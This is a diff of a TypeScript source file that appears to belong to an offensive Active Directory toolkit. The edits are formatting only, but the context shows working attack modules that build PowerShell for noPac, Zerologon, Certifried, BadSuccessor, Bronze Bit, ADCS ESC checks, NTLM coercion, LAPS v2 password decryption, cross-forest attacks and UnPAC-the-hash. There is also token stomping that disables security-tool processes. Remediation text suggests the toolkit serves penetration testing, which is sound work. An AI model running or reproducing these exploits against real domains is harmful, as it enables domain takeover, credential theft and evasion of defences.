@@ -8295,7 +8295,6 @@ try {
   return { output: output.join("\n"), findings }
 }
 
-
 // ── CVE-Based AD Attacks ──
 
 async function nopac(args: string[], timeout: number): Promise<HookResult> {
@@ -8379,7 +8378,8 @@ try {
       resource: "ad://domain/nopac",
       title: maq > 0 ? "Domain vulnerable to noPac (CVE-2021-42278/42287)" : "MachineAccountQuota is 0",
       details: `MachineAccountQuota=${maq}. ${maq > 0 ? "Any domain user can create machine accounts and exploit SAMAccountName spoofing for DC impersonation" : "Cannot create machine accounts — noPac not directly exploitable"}`,
-      remediation: "Apply KB5008102/KB5008380. Set MachineAccountQuota to 0. Monitor for suspicious machine account creation (Event ID 4741)",
+      remediation:
+        "Apply KB5008102/KB5008380. Set MachineAccountQuota to 0. Monitor for suspicious machine account creation (Event ID 4741)",
     })
   } else {
     if (!target) return { output: "[!] Required: --target DC_HOSTNAME (e.g. --target DC01)", findings }
@@ -8483,7 +8483,8 @@ Write-Output "[*] Cleanup: Delete machine account CN=$machineName,CN=Computers,$
       resource: `ad://${target}/nopac`,
       title: `noPac exploitation attempted against ${target}`,
       details: `SAMAccountName spoofing chain executed targeting DC ${target}. Machine account created for name collision attack`,
-      remediation: "Apply KB5008102/KB5008380 immediately. Set MachineAccountQuota to 0. Delete attack machine accounts from CN=Computers",
+      remediation:
+        "Apply KB5008102/KB5008380 immediately. Set MachineAccountQuota to 0. Delete attack machine accounts from CN=Computers",
     })
   }
 
@@ -8586,8 +8587,11 @@ if (-not $vulnerable) {
       status: isVuln ? "VULNERABLE" : "NOT_VULNERABLE",
       resource: `ad://${dc}/zerologon`,
       title: isVuln ? `${dc} vulnerable to Zerologon (CVE-2020-1472)` : `${dc} not vulnerable to Zerologon`,
-      details: isVuln ? "DC accepts zero-IV Netlogon authentication — complete domain compromise possible without credentials" : "DC rejected zero-IV authentication (patched)",
-      remediation: "Apply August 2020 security updates. Enable FullSecureChannelProtection registry key. Monitor Event ID 5829 for vulnerable Netlogon connections",
+      details: isVuln
+        ? "DC accepts zero-IV Netlogon authentication — complete domain compromise possible without credentials"
+        : "DC rejected zero-IV authentication (patched)",
+      remediation:
+        "Apply August 2020 security updates. Enable FullSecureChannelProtection registry key. Monitor Event ID 5829 for vulnerable Netlogon connections",
     })
   } else {
     output.push("[!!!] DANGER: Zerologon exploitation will BREAK the Domain Controller!")
@@ -8682,8 +8686,11 @@ if ($ret3 -eq 0) {
       status: result.stdout.includes("SUCCESS") ? "EXPLOITED" : "FAILED",
       resource: `ad://${dc}/zerologon`,
       title: `Zerologon exploitation ${result.stdout.includes("SUCCESS") ? "succeeded" : "failed"} against ${dc}`,
-      details: result.stdout.includes("SUCCESS") ? "DC machine account password set to empty — full domain compromise achieved. RESTORE PASSWORD IMMEDIATELY" : "Exploitation failed — DC may be patched",
-      remediation: "IMMEDIATE: Restore DC password with 'netdom resetpwd'. Apply August 2020 patches. Enable FullSecureChannelProtection",
+      details: result.stdout.includes("SUCCESS")
+        ? "DC machine account password set to empty — full domain compromise achieved. RESTORE PASSWORD IMMEDIATELY"
+        : "Exploitation failed — DC may be patched",
+      remediation:
+        "IMMEDIATE: Restore DC password with 'netdom resetpwd'. Apply August 2020 patches. Enable FullSecureChannelProtection",
     })
   }
 
@@ -8788,7 +8795,8 @@ Write-Output "[+] Found $vulnCount potentially vulnerable templates"
       resource: "ad://domain/certifried",
       title: isVuln ? "Domain vulnerable to Certifried (CVE-2022-26923)" : "Certifried conditions not met",
       details: result.stdout.substring(0, 500),
-      remediation: "Set StrongCertificateBindingEnforcement=2. Apply May 2022 patches (KB5014754). Remove enrollment permissions from machine templates for unprivileged users",
+      remediation:
+        "Set StrongCertificateBindingEnforcement=2. Apply May 2022 patches (KB5014754). Remove enrollment permissions from machine templates for unprivileged users",
     })
   } else {
     if (!ca) return { output: "[!] Required: --ca CA_NAME (use --action check to enumerate CAs)", findings }
@@ -8891,8 +8899,11 @@ Write-Output "[*] Cleanup: Delete CN=$machName,CN=Computers,$domainDN"
       status: result.stdout.includes("enrolled successfully") ? "EXPLOITED" : "FAILED",
       resource: `ad://${ca}/certifried`,
       title: `Certifried exploitation ${result.stdout.includes("enrolled successfully") ? "succeeded" : "failed"} via ${ca}`,
-      details: result.stdout.includes("enrolled successfully") ? `Certificate enrolled as DC — PKINIT authentication for DC impersonation possible` : "Certificate enrollment failed — CA may be patched",
-      remediation: "Apply KB5014754. Set StrongCertificateBindingEnforcement=2. Remove machine account and revoke any issued certificates",
+      details: result.stdout.includes("enrolled successfully")
+        ? `Certificate enrolled as DC — PKINIT authentication for DC impersonation possible`
+        : "Certificate enrollment failed — CA may be patched",
+      remediation:
+        "Apply KB5014754. Set StrongCertificateBindingEnforcement=2. Remove machine account and revoke any issued certificates",
     })
   }
 
@@ -9022,7 +9033,8 @@ if ($has2025) {
       resource: "ad://domain/bad-successor",
       title: isVuln ? "BadSuccessor (CVE-2025-53779) conditions detected" : "BadSuccessor conditions not met",
       details: result.stdout.substring(0, 500),
-      remediation: "Apply June 2025 patches. Restrict dMSA creation permissions. Monitor for new dMSA objects (Event ID 5136 on msDS-DelegatedManagedServiceAccount)",
+      remediation:
+        "Apply June 2025 patches. Restrict dMSA creation permissions. Monitor for new dMSA objects (Event ID 5136 on msDS-DelegatedManagedServiceAccount)",
     })
   } else {
     if (!target) return { output: "[!] Required: --target TARGET_USER (e.g. --target Administrator)", findings }
@@ -9116,8 +9128,11 @@ Write-Output "[*] Cleanup: Remove-ADServiceAccount -Identity $dmsaName"
       status: result.stdout.includes("chain complete") ? "EXPLOITED" : "FAILED",
       resource: `ad://${target}/bad-successor`,
       title: `BadSuccessor exploitation ${result.stdout.includes("chain complete") ? "succeeded" : "failed"} targeting ${target}`,
-      details: result.stdout.includes("chain complete") ? `dMSA created and linked to ${target} — impersonation possible` : "dMSA creation or linking failed",
-      remediation: "Apply CVE-2025-53779 patches. Remove unauthorized dMSA objects. Restrict CreateChild on Managed Service Accounts container",
+      details: result.stdout.includes("chain complete")
+        ? `dMSA created and linked to ${target} — impersonation possible`
+        : "dMSA creation or linking failed",
+      remediation:
+        "Apply CVE-2025-53779 patches. Remove unauthorized dMSA objects. Restrict CreateChild on Managed Service Accounts container",
     })
   }
 
@@ -9247,12 +9262,20 @@ if ($hotfixes) {
       severity: hasBypassTargets ? "high" : count > 0 ? "medium" : "info",
       status: hasBypassTargets ? "VULNERABLE" : count > 0 ? "DELEGATION_FOUND" : "NO_DELEGATION",
       resource: "ad://domain/bronze-bit",
-      title: hasBypassTargets ? "Bronze Bit bypass conditions detected" : `${count} constrained delegation accounts found`,
+      title: hasBypassTargets
+        ? "Bronze Bit bypass conditions detected"
+        : `${count} constrained delegation accounts found`,
       details: `${count} constrained delegation accounts. ${hasBypassTargets ? "Protected Users and NOT_DELEGATED accounts can be bypassed via forwardable bit manipulation" : "No high-value bypass targets detected"}`,
-      remediation: "Apply December 2020 patches. Set PerformTicketSignature=2 on all DCs. Enable Protected Users group for privileged accounts. Monitor Event ID 4771 for delegation anomalies",
+      remediation:
+        "Apply December 2020 patches. Set PerformTicketSignature=2 on all DCs. Enable Protected Users group for privileged accounts. Monitor Event ID 4771 for delegation anomalies",
     })
   } else {
-    if (!targetSpn) return { output: "[!] Required: --target TARGET_SPN (e.g. --target cifs/dc01.domain.local)\n[!] Use --service for the service to access\n[!] Use --impersonate for the user to impersonate", findings }
+    if (!targetSpn)
+      return {
+        output:
+          "[!] Required: --target TARGET_SPN (e.g. --target cifs/dc01.domain.local)\n[!] Use --service for the service to access\n[!] Use --impersonate for the user to impersonate",
+        findings,
+      }
 
     output.push("[!] Bronze Bit exploits constrained delegation to impersonate protected accounts")
     output.push(`[!] Target SPN: ${targetSpn}`)
@@ -9369,15 +9392,13 @@ Write-Output "    4. S4U2proxy: request ticket to $serviceSPN as $impUser"
       resource: `ad://${targetSpn}/bronze-bit`,
       title: `Bronze Bit attack attempted on ${targetSpn} to impersonate ${impersonateUser}`,
       details: `Constrained delegation bypass via forwardable bit manipulation targeting ${targetSpn}. Impersonating ${impersonateUser} (potentially Protected Users member)`,
-      remediation: "Apply December 2020 patches on all DCs. Set PerformTicketSignature=2. Consider removing constrained delegation entirely",
+      remediation:
+        "Apply December 2020 patches on all DCs. Set PerformTicketSignature=2. Consider removing constrained delegation entirely",
     })
   }
 
   return { output: output.join("\n"), findings }
 }
-
-
-
 
 // ── Extended & Stealth Programs ──
 
@@ -9404,7 +9425,9 @@ foreach ($caObj in $caResults) {
 
     # ESC9: CT_FLAG_NO_SECURITY_EXTENSION
     ${escTarget === "all" || escTarget === "9" ? "" : "# SKIP ESC9"}
-    ${escTarget === "all" || escTarget === "9" ? `
+    ${
+      escTarget === "all" || escTarget === "9"
+        ? `
     Write-Output "[*] ESC9: Checking StrongCertificateBindingEnforcement..."
     try {
         $scbe = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc" -Name StrongCertificateBindingEnforcement -ErrorAction SilentlyContinue).StrongCertificateBindingEnforcement
@@ -9432,10 +9455,14 @@ foreach ($caObj in $caResults) {
         }
     }
     Write-Output "    ESC9 templates found: $esc9Count"
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
     # ESC10: Weak CertificateMappingMethods
-    ${escTarget === "all" || escTarget === "10" ? `
+    ${
+      escTarget === "all" || escTarget === "10"
+        ? `
     Write-Output "[*] ESC10: Checking CertificateMappingMethods..."
     try {
         $cmm = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Schannel" -Name CertificateMappingMethods -ErrorAction SilentlyContinue).CertificateMappingMethods
@@ -9452,10 +9479,14 @@ foreach ($caObj in $caResults) {
     } catch {
         Write-Output "[-] ESC10: Cannot read CertificateMappingMethods"
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
     # ESC11: Unencrypted MS-ICPR RPC
-    ${escTarget === "all" || escTarget === "11" ? `
+    ${
+      escTarget === "all" || escTarget === "11"
+        ? `
     Write-Output "[*] ESC11: Checking IF_ENFORCEENCRYPTICERTREQUEST on CA..."
     try {
         $caConfig = certutil -config "$caHost\\$caName" -getreg CA\\InterfaceFlags 2>&1
@@ -9472,10 +9503,14 @@ foreach ($caObj in $caResults) {
     } catch {
         Write-Output "[-] ESC11: Cannot query CA interface flags"
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
     # ESC13: Issuance Policy OID Group Link
-    ${escTarget === "all" || escTarget === "13" ? `
+    ${
+      escTarget === "all" || escTarget === "13"
+        ? `
     Write-Output "[*] ESC13: Checking issuance policy OID group links..."
     $oidSearcher = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=OID,CN=Public Key Services,CN=Services,$configNC"))
     $oidSearcher.Filter = "(&(objectClass=msPKI-Enterprise-Oid)(msDS-OIDToGroupLink=*))"
@@ -9490,10 +9525,14 @@ foreach ($caObj in $caResults) {
     } else {
         Write-Output "[+] ESC13: No issuance policy OID-to-group links found"
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
     # ESC14: altSecurityIdentities explicit mapping
-    ${escTarget === "all" || escTarget === "14" ? `
+    ${
+      escTarget === "all" || escTarget === "14"
+        ? `
     Write-Output "[*] ESC14: Checking altSecurityIdentities explicit cert mappings..."
     $altSecSearcher = [System.DirectoryServices.DirectorySearcher]::new()
     $altSecSearcher.Filter = "(altSecurityIdentities=*)"
@@ -9515,10 +9554,14 @@ foreach ($caObj in $caResults) {
     if ($weakMappings -eq 0) {
         Write-Output "[+] ESC14: No weak altSecurityIdentities mappings found"
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
     # ESC15/EKUwu: V1 template application policy injection
-    ${escTarget === "all" || escTarget === "15" ? `
+    ${
+      escTarget === "all" || escTarget === "15"
+        ? `
     Write-Output "[*] ESC15/EKUwu: Checking schema version 1 templates with enrollee-controlled policies..."
     $v1Vuln = 0
     foreach ($tmpl in $templates) {
@@ -9537,10 +9580,14 @@ foreach ($caObj in $caResults) {
     if ($v1Vuln -eq 0) {
         Write-Output "[+] ESC15: No vulnerable schema V1 templates found"
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
     # ESC16: CA-wide security extension override
-    ${escTarget === "all" || escTarget === "16" ? `
+    ${
+      escTarget === "all" || escTarget === "16"
+        ? `
     Write-Output "[*] ESC16: Checking CA EditFlags for EDITF_ATTRIBUTESUBJECTALTNAME2..."
     try {
         $editFlags = certutil -config "$caHost\\$caName" -getreg policy\\EditFlags 2>&1
@@ -9553,10 +9600,14 @@ foreach ($caObj in $caResults) {
     } catch {
         Write-Output "[-] ESC16: Cannot query CA EditFlags"
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
     # ESC17: ADCS + WSUS combo
-    ${escTarget === "all" || escTarget === "17" ? `
+    ${
+      escTarget === "all" || escTarget === "17"
+        ? `
     Write-Output "[*] ESC17: Checking for WSUS + ADCS combination attack surface..."
     try {
         $wsusServer = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer
@@ -9572,7 +9623,9 @@ foreach ($caObj in $caResults) {
     } catch {
         Write-Output "[-] ESC17: Cannot check WSUS configuration"
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 }
 `
 
@@ -9624,7 +9677,9 @@ function Test-RpcEndpoint {
 }
 
 # Method 1-7: MS-EFSR Extended (7 additional opnums beyond EfsRpcOpenFileRaw)
-${method === "all" || method === "efsr_extended" ? `
+${
+  method === "all" || method === "efsr_extended"
+    ? `
 Write-Output "[*] MS-EFSR Extended (7 opnums)..."
 $efsrPipe = Test-RpcEndpoint $target "efsrpc"
 $lsarpcPipe = Test-RpcEndpoint $target "lsarpc"
@@ -9663,10 +9718,14 @@ if ($efsrPipe -or $lsarpcPipe) {
 } else {
     Write-Output "[-] MS-EFSR: Neither efsrpc nor lsarpc pipe accessible"
 }
-Write-Output ""` : ""}
+Write-Output ""`
+    : ""
+}
 
 # Method 8: MS-EVEN (Event Log Coercion)
-${method === "all" || method === "even" ? `
+${
+  method === "all" || method === "even"
+    ? `
 Write-Output "[*] MS-EVEN: Event Log coercion (ElfrOpenBELW)..."
 $evenPipe = Test-RpcEndpoint $target "eventlog"
 if ($evenPipe) {
@@ -9689,10 +9748,14 @@ if ($evenPipe) {
 } else {
     Write-Output "[-] MS-EVEN: eventlog pipe not accessible"
 }
-Write-Output ""` : ""}
+Write-Output ""`
+    : ""
+}
 
 # Method 9: MS-DNSP (DNS Admin Coercion)
-${method === "all" || method === "dnsp" ? `
+${
+  method === "all" || method === "dnsp"
+    ? `
 Write-Output "[*] MS-DNSP: DNS admin coercion..."
 try {
     $dns = Get-Service DNS -ComputerName $target -ErrorAction SilentlyContinue
@@ -9717,10 +9780,14 @@ try {
 } catch {
     Write-Output "[-] MS-DNSP: Cannot query DNS service status"
 }
-Write-Output ""` : ""}
+Write-Output ""`
+    : ""
+}
 
 # Method 10: WebClient / SearchConnector WebDAV
-${method === "all" || method === "webclient" ? `
+${
+  method === "all" || method === "webclient"
+    ? `
 Write-Output "[*] WebClient: SearchConnector WebDAV coercion..."
 try {
     $webclient = Get-Service WebClient -ComputerName $target -ErrorAction SilentlyContinue
@@ -9753,10 +9820,14 @@ try {
 } catch {
     Write-Output "[-] WebClient: Cannot query service"
 }
-Write-Output ""` : ""}
+Write-Output ""`
+    : ""
+}
 
 # Method 11: MS-SAMR coercion
-${method === "all" || method === "samr" ? `
+${
+  method === "all" || method === "samr"
+    ? `
 Write-Output "[*] MS-SAMR: SamrGetAliasMembership coercion..."
 $samrPipe = Test-RpcEndpoint $target "samr"
 if ($samrPipe) {
@@ -9765,7 +9836,9 @@ if ($samrPipe) {
 } else {
     Write-Output "[-] MS-SAMR: samr pipe not accessible"
 }
-Write-Output ""` : ""}
+Write-Output ""`
+    : ""
+}
 
 # Summary
 Write-Output "=== Coercion Summary ==="
@@ -9786,7 +9859,8 @@ foreach ($r in $results) { Write-Output "  [+] $r" }
       resource: `ntlm://${target}`,
       title: `${availableCount} extended NTLM coercion methods available`,
       details: result.stdout.substring(0, 500),
-      remediation: "Enable Extended Protection for Authentication, enforce SMB signing, disable unnecessary RPC services",
+      remediation:
+        "Enable Extended Protection for Authentication, enforce SMB signing, disable unnecessary RPC services",
     })
   }
 
@@ -9985,7 +10059,9 @@ $dangerousPrivs = @(
     "SeAssignPrimaryTokenPrivilege"
 )
 
-${action === "enum" ? `
+${
+  action === "enum"
+    ? `
 Write-Output "[*] Scanning for security tool processes..."
 Write-Output ""
 $found = @()
@@ -10024,7 +10100,9 @@ foreach ($toolName in $securityTools.Keys) {
     }
 }
 
-${targetProc ? `
+${
+  targetProc
+    ? `
 # Also check custom target
 $customProcs = Get-Process -Name "${targetProc}" -ErrorAction SilentlyContinue
 if ($customProcs) {
@@ -10032,14 +10110,17 @@ if ($customProcs) {
         $found += $p
         Write-Output "[+] CUSTOM TARGET: $($p.ProcessName) (PID: $($p.Id))"
     }
-}` : ""}
+}`
+    : ""
+}
 
 if ($found.Count -eq 0) {
     Write-Output "[-] No known security tools detected"
 }
 Write-Output ""
 Write-Output "[*] Total security tool processes found: $($found.Count)"
-` : `
+`
+    : `
 Write-Output "[*] Stomping token privileges on security tools..."
 $targetNames = ${targetProc ? `@("${targetProc}")` : "$securityTools.Keys"}
 $stompedCount = 0
@@ -10102,7 +10183,8 @@ foreach ($toolName in $targetNames) {
 
 Write-Output ""
 Write-Output "[+] Total processes stomped: $stompedCount"
-`}
+`
+}
 `
 
   const result = await ps(script, timeout)
@@ -10119,7 +10201,8 @@ Write-Output "[+] Total processes stomped: $stompedCount"
       resource: "process://security-tools",
       title: action === "stomp" ? `${count} security tool tokens stomped` : `${count} security tools detected`,
       details: result.stdout.substring(0, 500),
-      remediation: "Enable PPL for security tool processes. Monitor for NtAdjustPrivilegesToken calls on security processes.",
+      remediation:
+        "Enable PPL for security tool processes. Monitor for NtAdjustPrivilegesToken calls on security processes.",
     })
   }
 
@@ -10172,7 +10255,9 @@ if (-not $adModule) {
     Write-Output "[+] ActiveDirectory module loaded (all queries go via ADWS, not LDAP)"
     Write-Output ""
 
-    ${scope === "all" || scope === "users" ? `
+    ${
+      scope === "all" || scope === "users"
+        ? `
     # Users
     Write-Output "=== USERS (via ADWS) ==="
     $users = Get-ADUser -Filter * -Properties adminCount,Enabled,LastLogonDate,PasswordLastSet,ServicePrincipalName,DoesNotRequirePreAuth -Server $dcHost
@@ -10187,9 +10272,13 @@ if (-not $adModule) {
     foreach ($u in $kerberoastable) { Write-Output "    $($u.SamAccountName) — SPN: $($u.ServicePrincipalName -join ', ')" }
     Write-Output "[+] AS-REP Roastable: $($asrepRoastable.Count)"
     foreach ($u in $asrepRoastable) { Write-Output "    $($u.SamAccountName)" }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
-    ${scope === "all" || scope === "groups" ? `
+    ${
+      scope === "all" || scope === "groups"
+        ? `
     # Privileged Groups
     Write-Output "=== PRIVILEGED GROUPS (via ADWS) ==="
     $privGroups = @("Domain Admins","Enterprise Admins","Schema Admins","Backup Operators","Account Operators","Server Operators","DnsAdmins","Cert Publishers","Key Admins","Enterprise Key Admins")
@@ -10202,9 +10291,13 @@ if (-not $adModule) {
             }
         } catch {}
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
-    ${scope === "all" || scope === "computers" ? `
+    ${
+      scope === "all" || scope === "computers"
+        ? `
     # Computers
     Write-Output "=== COMPUTERS (via ADWS) ==="
     $computers = Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate,TrustedForDelegation,msDS-AllowedToDelegateTo -Server $dcHost
@@ -10215,9 +10308,13 @@ if (-not $adModule) {
         Write-Output "[!] Non-DC with unconstrained delegation: $($unconstrainedDeleg.Count)"
         foreach ($c in $unconstrainedDeleg) { Write-Output "    $($c.Name) — $($c.OperatingSystem)" }
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
-    ${scope === "all" || scope === "trusts" ? `
+    ${
+      scope === "all" || scope === "trusts"
+        ? `
     # Trusts
     Write-Output "=== TRUSTS (via ADWS) ==="
     $trusts = Get-ADTrust -Filter * -Server $dcHost -ErrorAction SilentlyContinue
@@ -10228,9 +10325,13 @@ if (-not $adModule) {
             Write-Output "    [!] SID Filtering DISABLED — cross-trust SID injection possible"
         }
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
-    ${scope === "all" || scope === "gpos" ? `
+    ${
+      scope === "all" || scope === "gpos"
+        ? `
     # GPOs
     Write-Output "=== GPOs (via ADWS) ==="
     $gpos = Get-GPO -All -Server $dcHost -ErrorAction SilentlyContinue
@@ -10238,9 +10339,13 @@ if (-not $adModule) {
     foreach ($g in $gpos) {
         Write-Output "    $($g.DisplayName) — Modified: $($g.ModificationTime)"
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 
-    ${scope === "all" || scope === "acls" ? `
+    ${
+      scope === "all" || scope === "acls"
+        ? `
     # AdminSDHolder ACL
     Write-Output "=== AdminSDHolder ACL (via ADWS) ==="
     $domainDN = (Get-ADDomain -Server $dcHost).DistinguishedName
@@ -10254,7 +10359,9 @@ if (-not $adModule) {
             Write-Output "    [!] DANGEROUS: $identity has $($rule.ActiveDirectoryRights)"
         }
     }
-    Write-Output ""` : ""}
+    Write-Output ""`
+        : ""
+    }
 }
 
 Write-Output "[+] ADWS reconnaissance complete"
@@ -10288,7 +10395,9 @@ async function lapsV2Decrypt(args: string[], timeout: number): Promise<HookResul
 $configNC = ([ADSI]"LDAP://RootDSE").configurationNamingContext
 $defaultNC = ([ADSI]"LDAP://RootDSE").defaultNamingContext
 
-${action === "enum" ? `
+${
+  action === "enum"
+    ? `
 Write-Output "[*] Enumerating Windows LAPS v2 (encrypted password) deployment..."
 
 # Check schema for LAPS v2 attributes
@@ -10373,7 +10482,8 @@ if ($first) {
     Write-Output "[+] Principals that can read LAPS passwords:"
     foreach ($r in $lapsReaders) { Write-Output "    $r" }
 }
-` : `
+`
+    : `
 Write-Output "[*] Attempting Windows LAPS v2 encrypted password decryption..."
 ${!computer ? 'Write-Output "[!] Required: --computer COMPUTER_NAME"; exit 1' : ""}
 
@@ -10447,7 +10557,8 @@ try {
 } catch {
     Write-Output "[!] Decryption error: $($_.Exception.Message)"
 }
-`}
+`
+}
 `
 
   const result = await ps(script, timeout)
@@ -10496,7 +10607,9 @@ async function primaryGroupAbuse(args: string[], timeout: number): Promise<HookR
   const script = `
 $domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
 
-${action === "check" ? `
+${
+  action === "check"
+    ? `
 Write-Output "[*] Checking primaryGroupID usage across domain..."
 
 # Well-known group RIDs
@@ -10547,7 +10660,9 @@ if ($suspiciousCount -gt 0) {
 } elseif ($results.Count -eq 0) {
     Write-Output "    (none found — all users have default primaryGroupID=513)"
 }
-` : action === "modify" ? `
+`
+    : action === "modify"
+      ? `
 Write-Output "[*] Modifying primaryGroupID for ${target || "unknown"}..."
 ${!target ? 'Write-Output "[!] Required: --target USER"; exit 1' : ""}
 
@@ -10614,7 +10729,8 @@ try {
     Write-Output "[!] Failed to set primaryGroupID: $($_.Exception.Message)"
     Write-Output "    Requires: WritePrimaryGroupID permission on the user object"
 }
-` : `
+`
+      : `
 # Revert
 Write-Output "[*] Reverting primaryGroupID to Domain Users (513)..."
 ${!target ? 'Write-Output "[!] Required: --target USER"; exit 1' : ""}
@@ -10636,7 +10752,8 @@ try {
 } catch {
     Write-Output "[!] Failed: $($_.Exception.Message)"
 }
-`}
+`
+}
 `
 
   const result = await ps(script, timeout)
@@ -10680,7 +10797,9 @@ async function crossForest(args: string[], timeout: number): Promise<HookResult>
   const output: string[] = ["[*] Inter-Forest Trust Operations...\n"]
 
   const script = `
-${action === "enum" ? `
+${
+  action === "enum"
+    ? `
 Write-Output "[*] Enumerating trust relationships..."
 
 # Get current domain/forest info
@@ -10795,12 +10914,15 @@ if ($krbtgtResult) {
         Write-Output "    [!] krbtgt password is $daysSinceChange days old — golden ticket risk"
     }
 }
-` : `
+`
+    : `
 Write-Output "[*] Cross-forest exploitation..."
 ${!targetForest ? 'Write-Output "[!] Required: --target-forest FOREST_NAME"; exit 1' : ""}
 ${!vector ? 'Write-Output "[!] Required: --vector <sidfilter|delegation|foreign_groups|pam|shared_creds>"; exit 1' : ""}
 
-${vector === "sidfilter" ? `
+${
+  vector === "sidfilter"
+    ? `
 Write-Output "[*] Checking SID filtering status for ${targetForest}..."
 $searcher = [System.DirectoryServices.DirectorySearcher]::new()
 $searcher.Filter = "(&(objectClass=trustedDomain)(name=${targetForest}))"
@@ -10823,7 +10945,9 @@ if ($trust) {
 } else {
     Write-Output "[-] Trust to ${targetForest} not found"
 }
-` : vector === "delegation" ? `
+`
+    : vector === "delegation"
+      ? `
 Write-Output "[*] Checking unconstrained delegation across trust to ${targetForest}..."
 Write-Output "[*] If a server with unconstrained delegation in THIS domain is accessed by"
 Write-Output "    a user from ${targetForest}, their TGT will be cached and can be extracted."
@@ -10834,7 +10958,9 @@ Write-Output "    2. Coerce auth from DC or privileged user in ${targetForest}"
 Write-Output "       Use: ntlm_coerce --target DC_OF_${targetForest} --listener DELEG_SERVER"
 Write-Output "    3. Extract TGT: pass_the_ticket --action list"
 Write-Output "    4. Use TGT to access ${targetForest} resources"
-` : vector === "foreign_groups" ? `
+`
+      : vector === "foreign_groups"
+        ? `
 Write-Output "[*] Enumerating foreign group memberships for ${targetForest}..."
 try {
     $targetContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest", "${targetForest}")
@@ -10855,7 +10981,9 @@ try {
 } catch {
     Write-Output "[!] Cannot connect to ${targetForest}: $_"
 }
-` : vector === "pam" ? `
+`
+        : vector === "pam"
+          ? `
 Write-Output "[*] Checking for PAM trust with ${targetForest}..."
 $searcher = [System.DirectoryServices.DirectorySearcher]::new()
 $searcher.Filter = "(&(objectClass=trustedDomain)(name=${targetForest}))"
@@ -10876,7 +11004,8 @@ if ($trust) {
 } else {
     Write-Output "[-] Trust to ${targetForest} not found"
 }
-` : `
+`
+          : `
 Write-Output "[*] Checking for shared credential patterns with ${targetForest}..."
 Write-Output "    If administrators use the same password across forests,"
 Write-Output "    a compromised hash from one forest works in the other."
@@ -10887,8 +11016,10 @@ Write-Output "    - Service accounts reused across forests"
 Write-Output "    - krbtgt hash reuse (rare but devastating)"
 Write-Output ""
 Write-Output "    Use dcsync + hashcat to check password reuse across forests"
-`}
-`}
+`
+}
+`
+}
 `
 
   const result = await ps(script, timeout)
@@ -10939,9 +11070,6 @@ Write-Output "    Use dcsync + hashcat to check password reuse across forests"
 
   return { output: output.join("\n"), findings }
 }
-
-
-
 
 // ── Advanced Kerberos ──
 
@@ -11445,7 +11573,9 @@ $domainDN = "DC=" + $domain.Name.Replace(".", ",DC=")
 $compName = $env:COMPUTERNAME
 Write-Output "[+] Domain: $($domain.Name) | DC: $dc | Machine: $compName"
 
-${method === "rbcd" ? `
+${
+  method === "rbcd"
+    ? `
 Write-Output ""
 Write-Output "[*] === RBCD Attack Chain ==="
 
@@ -11491,7 +11621,9 @@ Write-Output ""
 Write-Output "[*] Step 4: S4U2Self + S4U2Proxy"
 Write-Output "[*] $machAcct$ impersonates Administrator to $compName"
 Write-Output "[*] Result: CIFS service ticket as Administrator"
-` : method === "shadowcred" ? `
+`
+    : method === "shadowcred"
+      ? `
 Write-Output ""
 Write-Output "[*] === Shadow Credentials Chain ==="
 Write-Output ""
@@ -11503,11 +11635,12 @@ Write-Output "[*] Step 2: Relay machine auth → add msDS-KeyCredentialLink"
 Write-Output "[*] Step 3: PKINIT with private key → TGT as machine"
 Write-Output "[*] Step 4: UnPAC-the-hash → NT hash → S4U → SYSTEM"
 Write-Output "[*] Chain: winhook shadow_creds → winhook unpac_hash"
-` : `
+`
+      : `
 Write-Output ""
 Write-Output "[*] === ADCS Certificate Chain ==="
 Write-Output ""
-${ca ? `Write-Output "[*] Target CA: ${ca}"` : ''}
+${ca ? `Write-Output "[*] Target CA: ${ca}"` : ""}
 try {
     $rootDSE = [System.DirectoryServices.DirectoryEntry]::new("LDAP://RootDSE")
     $configDN = $rootDSE.Properties["configurationNamingContext"][0]
@@ -11520,7 +11653,8 @@ Write-Output "[*] Step 1: Relay machine auth → ADCS web enrollment"
 Write-Output "[*] Step 2: Request Machine template certificate"
 Write-Output "[*] Step 3: PKINIT with cert → TGT as machine"
 Write-Output "[*] Step 4: UnPAC → NT hash → SYSTEM"
-`}
+`
+}
 
 Write-Output ""
 Write-Output "[*] Detection:"
@@ -11577,7 +11711,7 @@ async function unpacHash(args: string[], timeout: number): Promise<HookResult> {
   const script = `
 Write-Output "[*] Certificate: ${cert}"
 Write-Output "[*] User: ${user}@${domain}"
-${dcArg ? `Write-Output "[*] DC: ${dcArg}"` : ''}
+${dcArg ? `Write-Output "[*] DC: ${dcArg}"` : ""}
 Write-Output ""
 
 Add-Type -TypeDefinition @"
@@ -11704,13 +11838,11 @@ Write-Output "[*] Detection: Event 4768 with PreAuthType=16 (PKINIT)"
     resource: `pkinit://${user}@${domain}`,
     title: `UnPAC-the-hash: NT hash recovery for ${user}`,
     details: `PKINIT cert auth → PAC_CREDENTIAL_INFO → NTLM hash. Completes cert-based attack chains`,
-    remediation: "Enforce StrongCertificateBindingEnforcement=2. Monitor Event 4768 PreAuthType=16. Audit msDS-KeyCredentialLink changes",
+    remediation:
